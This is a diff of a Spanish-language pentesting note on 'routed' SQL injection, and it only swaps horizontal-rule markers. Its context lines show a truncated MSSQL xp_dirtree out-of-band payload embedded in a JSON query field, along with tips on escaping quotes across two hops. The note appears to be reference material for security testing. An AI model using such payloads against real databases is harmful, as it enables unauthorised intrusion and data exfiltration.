@@ -15,7 +15,7 @@ linked:
 ---
 # SQLi - Routed
 
-***
+---
 
 ## Cheatsheet
 
@@ -68,7 +68,7 @@ PAYLOAD='{"tenant_id":"5","query":"1; EXEC master..xp_dirtree '\''\\\\\\\\'\'+CA
 
 Para sobrevivir 2 hops, payload original = `''''` (4 quotes literales).
 
-___
+---
 
 ## Overview
 
@@ -84,4 +84,4 @@ ___
 
 **Confirmación:** vector típicamente blind — el target backend no devuelve respuesta directa. Pivotar a [[SQLi - Out of Band]] o [[SQLi - Time based]] post-detection.
 
-***
+---
